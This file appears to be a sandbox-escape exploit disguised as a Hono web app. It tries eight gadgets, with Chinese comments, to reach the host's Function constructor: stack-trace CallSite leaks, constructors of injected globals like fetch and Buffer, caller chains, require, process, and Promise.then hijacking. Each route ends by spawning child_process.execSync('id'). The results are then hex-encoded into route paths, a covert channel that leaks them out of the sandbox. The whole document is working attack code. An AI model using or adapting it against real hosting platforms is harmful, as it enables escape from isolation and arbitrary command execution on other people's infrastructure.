const { Hono } = require('hono');
const app = new Hono();

const results = [];

// === Gadget A: Error.prepareStackTrace + CallSite.getFunction ===
// 如果能拿到 host 侧的函数引用，其 .constructor 是 host Function（不受 eval:false）
try {
  let hostFunc = null;
  Error.prepareStackTrace = function(err, trace) {
    for (let i = 0; i < trace.length; i++) {
      try {
        const fn = trace[i].getFunction();
        if (fn) { hostFunc = fn; break; }
      } catch(e) {}
    }
    return 'prepared';
  };
  Error.stackTraceLimit = 50;
  new Error().stack;
  if (hostFunc) {
    try {
      const p = hostFunc.constructor('return process')();
      results.push('A-PWN:' + p.mainModule.require('child_process').execSync('id').toString());
    } catch(e) { results.push('A-hostfunc-found-but:' + String(e).slice(0,150)); }
  } else {
    results.push('A-no-hostfunc');
  }
} catch(e) { results.push('A-err:' + String(e).slice(0,150)); }

// === Gadget B: sandbox 注入的 host 对象的原型链 ===
// fetch/setTimeout/Response/URL 等是从 host 注入的，尝试取它们的 constructor
try {
  // fetch 是 host 的 safeFetch 函数
  const FetchCtor = fetch.constructor;
  results.push('B-fetch-ctor:' + typeof FetchCtor + '|' + FetchCtor.name);
  try {
    const p = FetchCtor('return process')();
    results.push('B-PWN:' + p.mainModule.require('child_process').execSync('id').toString());
  } catch(e) { results.push('B-fetch-ctor-call:' + String(e).slice(0,150)); }
} catch(e) { results.push('B-err:' + String(e).slice(0,150)); }

// === Gadget C: Response/URL 等全局对象的原型链 ===
try {
  const targets = [
    ['Response', typeof Response !== 'undefined' ? Response : null],
    ['URL', typeof URL !== 'undefined' ? URL : null],
    ['Buffer', typeof Buffer !== 'undefined' ? Buffer : null],
    ['TextEncoder', typeof TextEncoder !== 'undefined' ? TextEncoder : null],
  ];
  for (const [name, obj] of targets) {
    if (!obj) continue;
    try {
      const ctor = obj.constructor;
      const p = ctor.constructor('return process')();
      results.push('C-PWN-via-' + name + ':' + p.mainModule.require('child_process').execSync('id').toString());
      break;
    } catch(e) {
      results.push('C-' + name + ':' + String(e).slice(0,80));
    }
  }
} catch(e) { results.push('C-err:' + String(e).slice(0,100)); }

// === Gadget D: arguments.callee.caller 链 ===
try {
  function probe() {
    try {
      const c = arguments.callee.caller;
      results.push('D-caller:' + typeof c + '|' + (c ? c.name : 'null'));
      if (c) {
        const p = c.constructor('return process')();
        results.push('D-PWN:' + p.mainModule.require('child_process').execSync('id').toString());
      }
    } catch(e) { results.push('D-inner:' + String(e).slice(0,100)); }
  }
  probe();
} catch(e) { results.push('D-err:' + String(e).slice(0,100)); }

// === Gadget E: require 本身的原型 ===
try {
  const r = require;
  results.push('E-require-type:' + typeof r + '|ctor:' + typeof r.constructor);
  const p = r.constructor('return process')();
  results.push('E-PWN:' + p.mainModule.require('child_process').execSync('id').toString());
} catch(e) { results.push('E-err:' + String(e).slice(0,100)); }

// === Gadget F: WeakRef / FinalizationRegistry ===
try {
  results.push('F-WeakRef:' + typeof WeakRef);
  results.push('F-FinReg:' + typeof FinalizationRegistry);
} catch(e) { results.push('F-err:' + String(e).slice(0,100)); }

// === Gadget G: process 对象本身（沙箱版） ===
try {
  results.push('G-process-ctor:' + typeof process.constructor);
  results.push('G-process-proto:' + typeof Object.getPrototypeOf(process));
  const p2 = process.constructor.constructor('return process')();
  results.push('G-PWN:' + p2.mainModule.require('child_process').execSync('id').toString());
} catch(e) { results.push('G-err:' + String(e).slice(0,100)); }

// === Gadget H: Symbol.species / Symbol.hasInstance 触发 ===
try {
  const origThen = Promise.prototype.then;
  let leaked = null;
  Promise.prototype.then = function(res, rej) {
    if (!leaked && res) leaked = res;
    return origThen.call(this, res, rej);
  };
  // 触发一个内部 Promise 操作
  Promise.resolve(1).then(() => {});
  Promise.prototype.then = origThen;
  if (leaked) {
    results.push('H-leaked:' + typeof leaked + '|' + leaked.name);
    const p = leaked.constructor('return process')();
    results.push('H-PWN:' + p.mainModule.require('child_process').execSync('id').toString());
  } else {
    results.push('H-no-leak');
  }
} catch(e) { results.push('H-err:' + String(e).slice(0,100)); }

// 编码输出
const output = results.join('\n');
const hex = Buffer.from(output).toString('hex');
for (let i = 0; i < hex.length && i < 5000; i += 50) {
  app.get(`/d${Math.floor(i/50)}_${hex.slice(i, i+50)}`, (c) => c.text(''));
}
module.exports = { default: app };
